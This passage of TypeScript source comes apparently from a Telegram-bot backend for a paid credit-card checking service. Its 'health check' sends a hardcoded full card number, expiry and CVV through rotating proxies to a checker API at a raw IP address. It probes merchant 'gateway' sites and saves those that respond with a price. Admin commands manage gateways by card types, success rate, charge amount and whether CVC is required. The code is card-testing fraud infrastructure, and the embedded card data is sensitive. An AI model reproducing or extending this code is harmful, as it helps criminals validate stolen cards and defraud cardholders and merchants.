          message_id: liveMessageId,
          is_stopped: false
        })
        .select()
        .single();

      const sessionId = session?.id;

      interface SiteResult {
        url: string;
        price: number;
        priceStr: string;
        rawResponse: string;
        status: "success" | "error";
        error?: string;
      }

      const results: SiteResult[] = [];
      
      // Helper function to extract price from response
      const extractPrice = (response: string): { price: number; priceStr: string } => {
        const pricePatterns = [
          /\$[\d,]+\.?\d*/g,
          /USD\s*[\d,]+\.?\d*/gi,
          /"price":\s*"?[\d.]+/gi,
          /"amount":\s*"?[\d.]+/gi,
          /"total":\s*"?[\d.]+/gi,
        ];

        let lowestPrice = Infinity;
        let priceStr = "$0.00";

        for (const pattern of pricePatterns) {
          const matches = response.match(pattern);
          if (matches) {
            for (const match of matches) {
              const numericMatch = match.replace(/[^0-9.]/g, "");
              const value = parseFloat(numericMatch);
              if (!isNaN(value) && value >= 0 && value < lowestPrice) {
                lowestPrice = value;
                priceStr = `$${value.toFixed(2)}`;
              }
            }
          }
        }

        return {
          price: lowestPrice === Infinity ? 0 : lowestPrice,
          priceStr: lowestPrice === Infinity ? "$0.00" : priceStr
        };
      };

      // Helper to build live update message with full raw response
      const buildLiveMessage = (
        currentIndex: number,
        totalSites: number,
        currentUrl: string,
        fullResponse: string,
        recentResults: SiteResult[],
        isStopped: boolean = false
      ): string => {
        const progress = Math.round((currentIndex / totalSites) * 100);
        const progressBar = "█".repeat(Math.floor(progress / 5)) + "░".repeat(20 - Math.floor(progress / 5));
        
        const successCount = recentResults.filter(r => r.status === "success").length;
        const errorCount = recentResults.filter(r => r.status === "error").length;
        
        // Get last 3 results for display
        const lastResults = recentResults.slice(-3).reverse();
        
        let resultsDisplay = "";
        const savedCount = recentResults.filter(r => r.status === "success" && r.price > 0).length;
        const removedCount = recentResults.filter(r => r.status === "error" || (r.status === "success" && r.price <= 0)).length;
        for (const r of lastResults) {
          const hasPriceVal = r.status === "success" && r.price > 0;
          const icon = hasPriceVal ? "✅" : "🗑️";
          const action = hasPriceVal ? "SAVED" : "REMOVED";
          const shortUrl = r.url.length > 25 ? r.url.substring(0, 25) + "..." : r.url;
          resultsDisplay += `${icon} ${shortUrl} → ${r.priceStr} [${action}]\n`;
        }

        const statusText = isStopped ? "🛑 <b>STOPPED</b>" : "🔄 <b>SCANNING...</b>";

        return `
━━━━━━━━━━━━━━━━━━━━━━
   🔍 <b>HEALTH CHECK</b>
━━━━━━━━━━━━━━━━━━━━━━
${statusText}

📊 <b>Progress:</b> ${currentIndex}/${totalSites}
[${progressBar}] ${progress}%

┌─────────────────────
│ ✅ Saved: <b>${savedCount}</b>
│ 🗑️ Removed: <b>${removedCount}</b>
└─────────────────────

🌐 <b>Current Site:</b>
<code>${currentUrl}</code>

━━━━━━━━━━━━━━━━━━━━━━
📝 <b>RAW API RESPONSE:</b>
━━━━━━━━━━━━━━━━━━━━━━
<code>${fullResponse.substring(0, 800)}${fullResponse.length > 800 ? "\n... (truncated)" : ""}</code>

━━━━━━━━━━━━━━━━━━━━━━
   <b>RECENT RESULTS</b>
━━━━━━━━━━━━━━━━━━━━━━
${resultsDisplay || "Waiting for results..."}
━━━━━━━━━━━━━━━━━━━━━━
`;
      };

      // Fetch live proxies from database
      const { data: liveProxies } = await supabase
        .from("proxies")
        .select("*")
        .eq("status", "live");

      // Build proxy string for API calls
      const getProxyStr = (): string => {
        if (!liveProxies || liveProxies.length === 0) return "";
        const randomProxy = liveProxies[Math.floor(Math.random() * liveProxies.length)];
        if (randomProxy.username && randomProxy.password) {
          return `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`;
        }
        return `${randomProxy.ip}:${randomProxy.port}`;
      };

      // Two API endpoints for checking sites
      const API_ENDPOINTS = [
        (site: string, cc: string, proxy: string) => 
          `http://108.165.12.183:8081/?cc=${cc}&url=${site}&proxy=${proxy}`,
      ];
      const TEST_CC = "4266841674104656|03|27|908";

      let wasStopped = false;

      // Process URLs one by one for live updates
      for (let i = 0; i < gatewayUrls.length; i++) {
        // Check if scan was stopped
        if (sessionId) {
          const { data: currentSession } = await supabase
            .from("health_check_sessions")
            .select("is_stopped")
            .eq("id", sessionId)
            .single();
          
          if (currentSession?.is_stopped) {
            wasStopped = true;
            await editTelegramMessage(
              chatId,
              liveMessageId,
              buildLiveMessage(i, gatewayUrls.length, "Scan stopped by user", "Process terminated", results, true)
            );
            break;
          }
        }

        const siteUrl = gatewayUrls[i].url;
        
        // Update message with current site being checked
        await editTelegramMessage(
          chatId,
          liveMessageId,
          buildLiveMessage(i, gatewayUrls.length, siteUrl, "⏳ Fetching response...", results),
          stopButton
        );

        try {
          const proxyStr = getProxyStr();
          let responseText = "";
          let success = false;

          // Try each API endpoint until one works
          for (const buildUrl of API_ENDPOINTS) {
            try {
              const controller = new AbortController();
              const timeoutId = setTimeout(() => controller.abort(), 60000); // 60s timeout for proxy requests

              const apiUrl = buildUrl(siteUrl, TEST_CC, proxyStr);
              
              const response = await fetch(apiUrl, {
                method: "GET",
                signal: controller.signal,
                headers: {
                  "User-Agent": "Mozilla/5.0",
                  "Accept": "application/json,*/*",
                }
              });

              clearTimeout(timeoutId);
              responseText = await response.text();
              
              if (response.ok && responseText.length > 0) {
                success = true;
                break;
              }
            } catch (apiErr) {
              // Try next endpoint
              continue;
            }
          }

          if (!success && !responseText) {
            throw new Error("All API endpoints failed");
          }
          const { price, priceStr } = extractPrice(responseText);

          results.push({
            url: siteUrl,
            price,
            priceStr,
            rawResponse: responseText,
            status: "success"
          });

          // Save working sites (with price) to gateway_urls
          if (price > 0) {
            await supabase.from("gateway_urls").upsert({ url: siteUrl }, { onConflict: "url", ignoreDuplicates: true });
          }

          // Update with full raw response
          await editTelegramMessage(
            chatId,
            liveMessageId,
            buildLiveMessage(i + 1, gatewayUrls.length, siteUrl, responseText, results),
            stopButton
          );

        } catch (error) {
          const errorMsg = error instanceof Error ? error.message : "Unknown error";
          results.push({
            url: siteUrl,
            price: -1,
            priceStr: "ERROR",
            rawResponse: errorMsg,
            status: "error",
            error: errorMsg
          });

          // Error = skip, don't save to gateway_urls

          await editTelegramMessage(
            chatId,
            liveMessageId,
            buildLiveMessage(i + 1, gatewayUrls.length, siteUrl, `❌ Error: ${errorMsg}`, results),
            stopButton
          );
        }

        // Small delay to avoid rate limiting on Telegram API
        await new Promise(resolve => setTimeout(resolve, 200));
      }

      // Clean up session
      if (sessionId) {
        await supabase.from("health_check_sessions").delete().eq("id", sessionId);
      }

      // Sort by price (lowest to highest), errors at the end
      results.sort((a, b) => {
        if (a.status === "error" && b.status === "error") return 0;
        if (a.status === "error") return 1;
        if (b.status === "error") return -1;
        return a.price - b.price;
      });

      // Group by price
      const priceGroups: Record<string, SiteResult[]> = {};
      for (const result of results) {
        const key = result.status === "error" ? "ERROR" : result.priceStr;
        if (!priceGroups[key]) {
          priceGroups[key] = [];
        }
        priceGroups[key].push(result);
      }

      const sortedPriceKeys = Object.keys(priceGroups).sort((a, b) => {
        if (a === "ERROR") return 1;
        if (b === "ERROR") return -1;
        const priceA = parseFloat(a.replace("$", "")) || 0;
        const priceB = parseFloat(b.replace("$", "")) || 0;
        return priceA - priceB;
      });

      // Build final summary message
      const successCount = results.filter(r => r.status === "success").length;
      const errorCount = results.filter(r => r.status === "error").length;

      let finalMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ${wasStopped ? "🛑 <b>SCAN STOPPED</b>" : "✅ <b>SCAN COMPLETE</b>"}
━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Summary:</b>
┌─────────────────────
│ 📁 Total Checked: <b>${results.length}</b>
│ ✅ Success: <b>${successCount}</b>
│ ❌ Errors: <b>${errorCount}</b>
│ 💰 Price Groups: <b>${sortedPriceKeys.filter(k => k !== "ERROR").length}</b>
└─────────────────────

━━━━━━━━━━━━━━━━━━━━━━
   <b>RESULTS BY PRICE</b>
   (Sorted: $0.00 → Highest)
━━━━━━━━━━━━━━━━━━━━━━
`;

      // Add top results to message
      let resultCount = 0;
      for (const priceKey of sortedPriceKeys) {
        if (resultCount >= 12) {
          finalMessage += `\n<i>... and more in the report file</i>`;
          break;
        }
        const sites = priceGroups[priceKey];
        finalMessage += `\n<b>【 ${priceKey} 】</b> (${sites.length} sites)\n`;
        for (const site of sites.slice(0, 2)) {
          const shortUrl = site.url.length > 30 ? site.url.substring(0, 30) + "..." : site.url;
          if (site.status === "error") {
            finalMessage += `❌ ${shortUrl}\n`;
          } else {
            finalMessage += `✅ ${shortUrl}\n`;
          }
          resultCount++;
        }
        if (sites.length > 2) {
          finalMessage += `<i>   + ${sites.length - 2} more...</i>\n`;
        }
      }

      finalMessage += `
━━━━━━━━━━━━━━━━━━━━━━
📄 <i>Full report with raw responses attached</i>
━━━━━━━━━━━━━━━━━━━━━━`;

      // Update final message (remove stop button)
      await editTelegramMessage(chatId, liveMessageId, finalMessage);

      // Generate full report file with raw responses
      let reportContent = `═══════════════════════════════════════\n`;
      reportContent += `       GATEWAY HEALTH CHECK REPORT\n`;
      reportContent += `       ${new Date().toISOString()}\n`;
      reportContent += `═══════════════════════════════════════\n\n`;
      reportContent += `Total Sites Checked: ${results.length}\n`;
      reportContent += `Successful: ${successCount}\n`;
      reportContent += `Errors: ${errorCount}\n`;
      reportContent += `Status: ${wasStopped ? "STOPPED BY USER" : "COMPLETED"}\n\n`;
      reportContent += `───────────────────────────────────────\n`;
      reportContent += `           RESULTS BY PRICE\n`;
      reportContent += `       (Sorted: $0.00 → Highest)\n`;
      reportContent += `───────────────────────────────────────\n\n`;

      for (const priceKey of sortedPriceKeys) {
        const sites = priceGroups[priceKey];
        reportContent += `\n════════════════════════════════════════\n`;
        reportContent += `【 ${priceKey} 】 (${sites.length} sites)\n`;
        reportContent += `════════════════════════════════════════\n`;
        
        for (const site of sites) {
          reportContent += `\n────────────────────────────────────────\n`;
          reportContent += `URL: ${site.url}\n`;
          reportContent += `Price: ${site.priceStr}\n`;
          reportContent += `Status: ${site.status.toUpperCase()}\n`;
          reportContent += `────────────────────────────────────────\n`;
          if (site.status === "error") {
            reportContent += `Error: ${site.error}\n`;
          } else {
            reportContent += `FULL RAW RESPONSE:\n`;
            reportContent += `${site.rawResponse}\n`;
          }
          reportContent += `\n`;
        }
      }

      reportContent += `\n═══════════════════════════════════════\n`;
      reportContent += `              END OF REPORT\n`;
      reportContent += `═══════════════════════════════════════\n`;

      const filename = `healthcheck_${new Date().toISOString().split("T")[0]}_${Date.now()}.txt`;

      await sendTelegramDocument(
        chatId,
        reportContent,
        filename,
        `📊 <b>Full Health Check Report</b>\n\n✅ Success: ${successCount}\n❌ Errors: ${errorCount}\n💰 Price Groups: ${sortedPriceKeys.filter(k => k !== "ERROR").length}\n\n<i>Contains full raw API responses</i>`
      );

      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // GATEWAY STATUS COMMAND (Admin Only)
    // ─────────────────────────────────────────────────────────

    // /gate - Set gateway availability status
    if (text === "/gate") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Fetch all gateways with their current status
      const { data: gateways, error: gateError } = await supabase
        .from("gateway_status")
        .select("id, name, status, updated_at")
        .order("name", { ascending: true });

      if (gateError) {
        await sendTelegramMessage(chatId, "❌ <b>Error</b>\n\nFailed to fetch gateway status.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const statusEmojis: Record<string, string> = {
        online: "🟢",
        offline: "🔴",
        unavailable: "🟡"
      };

      let gateMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   🌐 <b>GATEWAY CONTROL</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📊 Current Status:</b>
`;

      gateways?.forEach((g: any) => {
        gateMessage += `${statusEmojis[g.status] || "⚪"} <b>${g.name}</b> - ${g.status.toUpperCase()}\n`;
      });

      gateMessage += `
━━━━━━━━━━━━━━━━━━━━━━
<i>Select a gateway to change its status</i>
`;

      // Build gateway selection keyboard
      const gatewayButtons: any[][] = [];
      gateways?.forEach((g: any) => {
        gatewayButtons.push([{
          text: `${statusEmojis[g.status] || "⚪"} ${g.name}`,
          callback_data: `gate_select_${g.id}`
        }]);
      });
      gatewayButtons.push([{ text: "🔙 Back to Menu", callback_data: "menu_back" }]);

      await sendTelegramMessage(chatId, gateMessage, { inline_keyboard: gatewayButtons });
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // ADD GATEWAY COMMAND (Admin Only)
    // ─────────────────────────────────────────────────────────

    // /addgate - Start multi-step gateway addition flow
    if (text === "/addgate") {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Clear any existing pending additions for this admin
      await supabase
        .from("pending_gateway_additions")
        .delete()
        .eq("admin_chat_id", chatId);

      // Create new pending addition
      await supabase
        .from("pending_gateway_additions")
        .insert({
          admin_chat_id: chatId,
          step: "id"
        });

      const startMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ➕ <b>ADD NEW GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

Let's add a new gateway to the platform!
I'll guide you through the configuration.

<b>Step 1/12: Gateway ID</b>
━━━━━━━━━━━━━━━━━━━━━━
Enter a unique ID for this gateway.
Use lowercase letters, numbers, and
underscores only.

<b>Example:</b> <code>custom_auth</code> or <code>new_charge</code>

━━━━━━━━━━━━━━━━━━━━━━
<i>Reply with the gateway ID:</i>
`;

      await sendTelegramMessage(chatId, startMessage, {
        inline_keyboard: [
          [{ text: "❌ Cancel", callback_data: "addgate_cancel" }]
        ]
      });
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // DELETE GATEWAY COMMAND (Admin Only)
    // ─────────────────────────────────────────────────────────

    if (text?.startsWith("/delgate")) {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const gatewayId = text.replace("/delgate", "").trim();
      
      if (!gatewayId) {
        // Show list of gateways to delete
        const { data: gateways } = await supabase
          .from("gateways")
          .select("id, name")
          .eq("is_active", true)
          .order("display_order", { ascending: true });

        if (!gateways || gateways.length === 0) {
          await sendTelegramMessage(chatId, "❌ No gateways found.");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        let listMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   🗑️ <b>DELETE GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

Select a gateway to delete:
`;

        const deleteButtons: any[][] = [];
        gateways.forEach((g: any) => {
          deleteButtons.push([{
            text: `🗑️ ${g.name} (${g.id})`,
            callback_data: `delgate_confirm_${g.id}`
          }]);
        });
        deleteButtons.push([{ text: "🔙 Cancel", callback_data: "menu_back" }]);

        await sendTelegramMessage(chatId, listMessage, { inline_keyboard: deleteButtons });
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Direct delete by ID
      const { data: gateway, error: fetchError } = await supabase
        .from("gateways")
        .select("id, name")
        .eq("id", gatewayId)
        .single();

      if (fetchError || !gateway) {
        await sendTelegramMessage(chatId, `❌ Gateway <code>${escapeHtml(gatewayId)}</code> not found.`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      await sendTelegramMessage(chatId, `
⚠️ <b>Confirm Deletion</b>

Are you sure you want to delete:
<b>${escapeHtml(gateway.name)}</b> (${escapeHtml(gateway.id)})?

This action cannot be undone.
`, {
        inline_keyboard: [
          [
            { text: "✅ Yes, Delete", callback_data: `delgate_exec_${gateway.id}` },
            { text: "❌ Cancel", callback_data: "menu_back" }
          ]
        ]
      });
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // EDIT GATEWAY COMMAND (Admin Only)
    // ─────────────────────────────────────────────────────────

    if (text?.startsWith("/editgate")) {
      const isAdminUser = await isAdminAsync(chatId, supabase);
      if (!isAdminUser) {
        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const gatewayId = text.replace("/editgate", "").trim();
      
      if (!gatewayId) {
        // Show list of gateways to edit
        const { data: gateways } = await supabase
          .from("gateways")
          .select("id, name, status")
          .eq("is_active", true)
          .order("display_order", { ascending: true });

        if (!gateways || gateways.length === 0) {
          await sendTelegramMessage(chatId, "❌ No gateways found.");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        const statusEmojis: Record<string, string> = {
          online: "🟢",
          offline: "🔴",
          unavailable: "🟡"
        };

        let listMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ✏️ <b>EDIT GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

Select a gateway to edit:
`;

        const editButtons: any[][] = [];
        gateways.forEach((g: any) => {
          editButtons.push([{
            text: `${statusEmojis[g.status] || "⚪"} ${g.name}`,
            callback_data: `editgate_select_${g.id}`
          }]);
        });
        editButtons.push([{ text: "🔙 Cancel", callback_data: "menu_back" }]);

        await sendTelegramMessage(chatId, listMessage, { inline_keyboard: editButtons });
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      // Show edit options for specific gateway
      const { data: gateway, error: fetchError } = await supabase
        .from("gateways")
        .select("*")
        .eq("id", gatewayId)
        .single();

      if (fetchError || !gateway) {
        await sendTelegramMessage(chatId, `❌ Gateway <code>${escapeHtml(gatewayId)}</code> not found.`);
        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      const statusEmojis: Record<string, string> = {
        online: "🟢",
        offline: "🔴",
        unavailable: "🟡"
      };

      const editMessage = `
━━━━━━━━━━━━━━━━━━━━━━
   ✏️ <b>EDIT GATEWAY</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>ID:</b> <code>${escapeHtml(gateway.id)}</code>
<b>Name:</b> ${escapeHtml(gateway.name)}
<b>Code:</b> ${gateway.code ? escapeHtml(gateway.code) : "N/A"}
<b>Type:</b> ${gateway.type}
<b>Status:</b> ${statusEmojis[gateway.status]} ${gateway.status}
<b>Card Types:</b> ${escapeHtml(gateway.card_types)}
<b>Speed:</b> ${escapeHtml(gateway.speed)}
<b>Success Rate:</b> ${gateway.success_rate}
<b>Description:</b> ${escapeHtml(gateway.description)}
<b>Icon:</b> ${gateway.icon_name} (${gateway.icon_color})
<b>Edge Function:</b> ${gateway.edge_function_name || "N/A"}
<b>Charge Amount:</b> ${gateway.charge_amount || "N/A"}
<b>CVC Required:</b> ${gateway.cvc_required ? "Yes" : "No"}
<b>Display Order:</b> ${gateway.display_order}

━━━━━━━━━━━━━━━━━━━━━━
<i>Select a field to edit:</i>
`;

      const fieldButtons = [
        [
          { text: "📝 Name", callback_data: `editgate_field_${gateway.id}_name` },
          { text: "🏷️ Code", callback_data: `editgate_field_${gateway.id}_code` }
        ],
        [
          { text: "📋 Description", callback_data: `editgate_field_${gateway.id}_description` },
          { text: "💳 Card Types", callback_data: `editgate_field_${gateway.id}_card_types` }
        ],
        [
          { text: "⚡ Speed", callback_data: `editgate_field_${gateway.id}_speed` },
          { text: "📊 Success Rate", callback_data: `editgate_field_${gateway.id}_success_rate` }
        ],
        [
          { text: "💰 Charge Amount", callback_data: `editgate_field_${gateway.id}_charge_amount` },
          { text: "🔢 CVC Required", callback_data: `editgate_toggle_${gateway.id}_cvc` }
        ],
        [
          { text: "🎨 Icon Name", callback_data: `editgate_field_${gateway.id}_icon_name` },
          { text: "🎨 Icon Color", callback_data: `editgate_field_${gateway.id}_icon_color` }
        ],
        [
          { text: "⚙️ Edge Function", callback_data: `editgate_field_${gateway.id}_edge_function_name` },
          { text: "📊 Display Order", callback_data: `editgate_field_${gateway.id}_display_order` }
        ],
        [{ text: "🔙 Back", callback_data: "menu_back" }]
      ];

      await sendTelegramMessage(chatId, editMessage, { inline_keyboard: fieldButtons });
      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // ─────────────────────────────────────────────────────────
    // PENDING TOPUP REJECTION - CUSTOM REASON HANDLER
    // ─────────────────────────────────────────────────────────

    if (text && !text.startsWith("/")) {
      // Check for pending topup rejection with custom reason
      const { data: pendingRejection } = await supabase
        .from("pending_bans")
        .select("*")
        .eq("admin_chat_id", chatId)
        .like("step", "topup_reject_custom_%")
        .order("created_at", { ascending: false })
        .limit(1)
        .maybeSingle();

      if (pendingRejection) {
        const transactionId = pendingRejection.step.replace("topup_reject_custom_", "");
        const customReason = text.trim();

        // Clean up pending state
        await supabase.from("pending_bans").delete().eq("id", pendingRejection.id);

        // Fetch transaction
        const { data: transaction } = await supabase
          .from("topup_transactions")
          .select("*")
          .eq("id", transactionId)
          .maybeSingle();

        if (!transaction) {
          await sendTelegramMessage(chatId, "❌ Transaction not found or already processed.");
          return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
        }

        // Update transaction with custom rejection reason
        // Update transaction with custom rejection reason (already status=failed from initial reject)
        await supabase.from("topup_transactions").update({ 
          rejection_reason: customReason 
        }).eq("id", transactionId);

        // Fetch user profile
        const { data: profile } = await supabase
          .from("profiles")
          .select("username, telegram_chat_id")
          .eq("user_id", transaction.user_id)
          .maybeSingle();

        const { data: authData } = await supabase.auth.admin.listUsers();
        const userAuth = authData?.users?.find((u: any) => u.id === transaction.user_id);
        const userEmail = userAuth?.email || "Unknown";

        const credits = Number(transaction.amount);
        const username = profile?.username || "Unknown";
        const paymentMethod = transaction.payment_method?.toUpperCase() || "Unknown";
        const timestamp = new Date().toLocaleString("en-US", { 
          month: "short", day: "numeric", year: "numeric", 
          hour: "2-digit", minute: "2-digit" 
        });

        // Notify user via Telegram
        if (profile?.telegram_chat_id) {
          await sendTelegramMessage(profile.telegram_chat_id, `❌ <b>Topup Rejected</b>\n\n<b>Amount:</b> ${credits} credits\n<b>Reason:</b> ${customReason}\n\nPlease submit a new request with valid payment proof.`);
        }

        // Create website notification
        await supabase.from("notifications").insert({
          user_id: transaction.user_id,
          type: "topup_rejected",
          title: "Top-up Request Rejected",
          message: `Your top-up request for ${credits} credits was rejected. Reason: ${customReason}`,
          metadata: { transaction_id: transactionId, rejection_reason: customReason }
        });

        // Send email notification
        if (userEmail && userEmail !== "Unknown" && RESEND_API_KEY) {
          const emailHtml = `
            <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #0a0a0a;">
              <div style="background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); padding: 30px; text-align: center; border-radius: 16px 16px 0 0;">
                <h1 style="color: white; margin: 0; font-size: 24px;">❌ Top-up Rejected</h1>
              </div>
              <div style="background: #0f0f0f; padding: 30px; border-radius: 0 0 16px 16px; color: #e5e5e5; border: 1px solid #1a1a1a; border-top: none;">
                <p style="color: #e5e5e5; font-size: 16px; line-height: 1.6;">Hello${username && username !== "Unknown" ? ` <strong style="color: #ef4444;">${escapeHtml(username)}</strong>` : ''},</p>
                
                <p style="color: #a3a3a3; font-size: 16px; line-height: 1.6;">Unfortunately, your top-up request has been rejected.</p>
                
                <div style="background: #1a0a0a; border-left: 4px solid #dc2626; border-radius: 8px; padding: 20px; margin: 25px 0;">
                  <p style="color: #a3a3a3; margin: 5px 0;"><strong style="color: #e5e5e5;">Amount:</strong> ${credits} credits</p>
                  <p style="color: #a3a3a3; margin: 5px 0;"><strong style="color: #e5e5e5;">Payment Method:</strong> ${paymentMethod}</p>
                  <p style="color: #a3a3a3; margin: 5px 0;"><strong style="color: #e5e5e5;">Rejection Reason:</strong></p>
                  <p style="color: #ef4444; font-size: 15px; margin: 10px 0 0 0;">${escapeHtml(customReason)}</p>
                </div>
                
                <p style="color: #a3a3a3; font-size: 14px; line-height: 1.6;">Please review the rejection reason and submit a new request with valid payment proof if needed.</p>
                
                <div style="text-align: center; margin-top: 25px;">
                  <a href="https://yunchicheck.com/dashboard/topup" style="display: inline-block; background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); color: white; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-weight: bold;">Submit New Request</a>
                </div>
                
                <hr style="border: none; border-top: 1px solid #262626; margin: 30px 0;">
                
                <p style="color: #525252; font-size: 12px; text-align: center;">
                  If you believe this is an error, please contact support.<br>
                  — Yunchi Team
                </p>
              </div>
            </div>
          `;

          try {
            await fetch("https://api.resend.com/emails", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${RESEND_API_KEY}`,
              },
              body: JSON.stringify({
                from: "Yunchi <noreply@yunchicheck.com>",
                reply_to: "support@yunchicheck.com",
                to: [userEmail],
                subject: "❌ Your Top-up Request Was Rejected",
                html: emailHtml,
                headers: { "X-Entity-Ref-ID": crypto.randomUUID() },
              }),
            });
          } catch (emailError) {
            console.error("Failed to send rejection email:", emailError);
          }
        }

        // Send confirmation to admin
        await sendTelegramMessage(chatId, `
✅ <b>Topup Rejected</b>

<b>User:</b> ${escapeHtml(username)}
<b>Amount:</b> ${credits} credits
<b>Reason:</b> ${escapeHtml(customReason)}
<b>Time:</b> ${timestamp}

📧 User notified via Telegram, Website & Email
`);

        // Notify super admin if a moderator took the action
        await notifyAdminOfStaffAction(chatId, "❌ Topup Rejected (Custom)", `<b>User:</b> ${escapeHtml(username)}\n<b>Amount:</b> ${credits} credits\n<b>Reason:</b> ${escapeHtml(customReason)}`, supabase);

        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }
    }

    // ─────────────────────────────────────────────────────────
    // PENDING GATEWAY ADDITION - TEXT INPUT HANDLER
    // ─────────────────────────────────────────────────────────

    // Check for pending gateway additions (multi-step flow)
    if (text && !text.startsWith("/")) {
      const { data: pendingAddition } = await supabase
        .from("pending_gateway_additions")
        .select("*")
        .eq("admin_chat_id", chatId)
        .order("created_at", { ascending: false })
        .limit(1)
        .single();

      if (pendingAddition) {
        const step = pendingAddition.step;
        const inputValue = text.trim();

        // Step handlers
        const stepConfig: Record<string, { nextStep: string; field: string; stepNum: number; nextPrompt: string }> = {
          id: { nextStep: "name", field: "gateway_id", stepNum: 2, nextPrompt: "Enter the display name for this gateway.\n\n<b>Example:</b> <code>Chaos-auth-check</code>" },
          name: { nextStep: "code", field: "gateway_name", stepNum: 3, nextPrompt: "Enter a short code for this gateway (optional).\nPress /skip to skip.\n\n<b>Example:</b> <code>St4</code> or <code>B4</code>" },
          code: { nextStep: "type", field: "gateway_code", stepNum: 4, nextPrompt: "Select the gateway type:" },
          type: { nextStep: "card_types", field: "gateway_type", stepNum: 5, nextPrompt: "Enter supported card types.\n\n<b>Example:</b> <code>Visa/MC/Amex</code>" },
          card_types: { nextStep: "speed", field: "card_types", stepNum: 6, nextPrompt: "Enter the speed rating.\n\n<b>Examples:</b> <code>⚡ Blazing</code>, <code>Fast</code>, <code>Medium</code>" },
          speed: { nextStep: "success_rate", field: "speed", stepNum: 7, nextPrompt: "Enter the success rate.\n\n<b>Example:</b> <code>95%</code>" },
          success_rate: { nextStep: "description", field: "success_rate", stepNum: 8, nextPrompt: "Enter the description.\n\n<b>Example:</b> <code>$0 Auth Check • CVC optional</code>" },
          description: { nextStep: "icon_name", field: "description", stepNum: 9, nextPrompt: "Enter the icon name (Lucide icon).\n\n<b>Options:</b> <code>Zap</code>, <code>CreditCard</code>, <code>Wallet</code>, <code>Sparkles</code>, <code>Store</code>, <code>ShoppingBag</code>, <code>CircleDollarSign</code>" },
          icon_name: { nextStep: "icon_color", field: "icon_name", stepNum: 10, nextPrompt: "Enter the icon color (Tailwind class).\n\n<b>Example:</b> <code>text-purple-500</code>, <code>text-blue-500</code>, <code>text-green-500</code>" },
          icon_color: { nextStep: "edge_function", field: "icon_color", stepNum: 11, nextPrompt: "Enter the edge function name (optional).\nPress /skip to skip.\n\n<b>Example:</b> <code>Chaos-auth-check</code>" },
          edge_function: { nextStep: "charge_amount", field: "edge_function_name", stepNum: 12, nextPrompt: "Enter the charge amount (for charge gateways).\nPress /skip to skip.\n\n<b>Example:</b> <code>$10.00</code> or <code>custom</code>" },
          charge_amount: { nextStep: "cvc_required", field: "charge_amount", stepNum: 13, nextPrompt: "Is CVC required?" },
        };

        const currentConfig = stepConfig[step];

        if (step === "id") {
          // Validate ID format
          if (!/^[a-z0-9_]+$/.test(inputValue)) {
            await sendTelegramMessage(chatId, "❌ Invalid ID format. Use only lowercase letters, numbers, and underscores.");
            return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
          }

          // Check if ID already exists
          const { data: existing } = await supabase
            .from("gateways")
            .select("id")
            .eq("id", inputValue)
            .single();

